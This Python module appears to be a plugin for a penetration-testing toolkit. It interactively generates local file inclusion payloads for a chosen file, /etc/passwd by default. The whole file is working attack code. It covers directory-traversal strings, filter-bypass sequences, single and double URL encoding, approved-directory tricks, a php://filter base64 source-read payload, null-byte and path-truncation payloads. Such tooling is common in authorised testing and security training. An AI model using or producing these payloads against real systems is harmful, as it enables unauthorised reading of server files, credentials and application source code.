from urllib.parse import quote

PROVIDES = []
REQUIRES = []

# =========================================================
# COLORS
# =========================================================

G = '\033[92m'
C = '\033[96m'
B = '\033[94m'
Y = '\033[93m'
R = '\033[91m'
W = '\033[0m'
BOLD = '\033[1m'


# =========================================================
# HELPERS
# =========================================================

def traversal(target):

    payloads = []

    payloads.append(target)

    for i in range(3, 9):
        payloads.append("../" * i + target.lstrip("/"))

    return payloads


def prefix(target):

    return [
        "/../../../" + target.lstrip("/"),
        "//../../../" + target.lstrip("/"),
        "///../../../" + target.lstrip("/"),
    ]


def recursive(target):

    t = target.lstrip("/")

    return [
        "....//" * 6 + t,
        "..././" * 6 + t,
        "....\\\\/" * 6 + t,
        "....////" * 6 + t,
    ]


def encoded(target):

    p = "../../../../" + target.lstrip("/")

    single = quote(p, safe="")
    double = quote(single, safe="")

    return [
        single,
        double,
    ]


def approved(target):

    t = target.lstrip("/")

    dirs = [
        "languages",
        "lang",
        "includes",
        "include",
        "templates",
        "template",
        "views",
        "modules",
    ]

    payloads = []

    for d in dirs:

        payloads.extend([
            f"./{d}/../../../../{t}",
            f"{d}/../../../../{t}",
            f"{d}//../../../../{t}",
            f"./{d}//../../../../{t}",
            f"{d}//....//....//....//....//{t}",
            f"./{d}//....//....//....//....//{t}",
        ])

    return payloads


def php_filters(target):

    resource = target

    if resource.endswith(".php"):
        resource = resource[:-4]

    if "/" in resource:
        resource = resource.split("/")[-1]

    return [
        f"php://filter/read=convert.base64-encode/resource={resource}",
    ]


def old_php(target):

    payloads = []

    payloads.append(target + "%00")

    long = (
        "non_existing_directory/"
        "../../../"
        + target.lstrip("/")
        + "/"
    )

    long += "./" * 2048

    payloads.append(long)

    return payloads


def everything(target):

    p = []

    p.extend(traversal(target))
    p.extend(prefix(target))
    p.extend(recursive(target))
    p.extend(encoded(target))
    p.extend(approved(target))
    p.extend(php_filters(target))
    p.extend(old_php(target))

    return p


def print_payloads(title, payloads):

    print()
    print(f"{G}[+] {title}{W}\n")

    for p in payloads:
        print(f"  {C}{p}{W}")

    print()


# =========================================================
# MAIN
# =========================================================

def run(data, cred, args):

    target = input(
        f"{Y}Target File [/etc/passwd]> {W}"
    ).strip()

    if not target:
        target = "/etc/passwd"

    print()

    print(f"{B}Payload Set{W}\n")

    print(f"  {B}[{C}1{B}]{W} Basic LFI")
    print(f"  {B}[{C}2{B}]{W} Prefix Bypass")
    print(f"  {B}[{C}3{B}]{W} Traversal Filter Bypass")
    print(f"  {B}[{C}4{B}]{W} URL Encoding")
    print(f"  {B}[{C}5{B}]{W} Approved Path")
    print(f"  {B}[{C}6{B}]{W} PHP Filters")
    print(f"  {B}[{C}7{B}]{W} Old PHP Tricks")
    print(f"  {B}[{C}8{B}]{W} Everything")

    print()

    choice = input(
        f"{Y}Select> {W}"
    ).strip()

    if choice == "1":
        print_payloads("Basic LFI", traversal(target))

    elif choice == "2":
        print_payloads("Prefix Bypass", prefix(target))

    elif choice == "3":
        print_payloads("Traversal Filter Bypass", recursive(target))

    elif choice == "4":
        print_payloads("URL Encoding", encoded(target))

    elif choice == "5":
        print_payloads("Approved Path", approved(target))

    elif choice == "6":
        print_payloads("PHP Filters", php_filters(target))

    elif choice == "7":
        print_payloads("Old PHP Tricks", old_php(target))

    elif choice == "8":
        print_payloads("Everything", everything(target))

    else:
        print(f"\n{R}[!] Invalid option.{W}\n")
        return

